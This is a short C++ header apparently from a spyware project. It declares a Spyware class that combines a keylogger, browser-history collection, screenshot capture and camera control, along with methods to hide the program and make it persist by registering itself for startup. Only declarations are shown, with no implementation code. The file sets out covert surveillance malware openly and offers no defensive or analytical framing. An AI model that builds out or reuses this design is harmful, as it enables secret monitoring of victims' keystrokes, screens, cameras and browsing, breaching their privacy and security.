#pragma once
#include "CameraManager.h"
#include "HistoryBrowser.h"
#include "Keylogger.h"
#include "ScreenshotInterface.h"

class Spyware
{
public:
	Spyware();
	~Spyware();
	void Persist();
	void Hide();

	HistoryBrowser browser;
	Keylogger keylogger;
	ScreenshotInterface screenshot;
	CameraManager camera;

private:
	BOOL RegisterMyProgramForStartup();
};
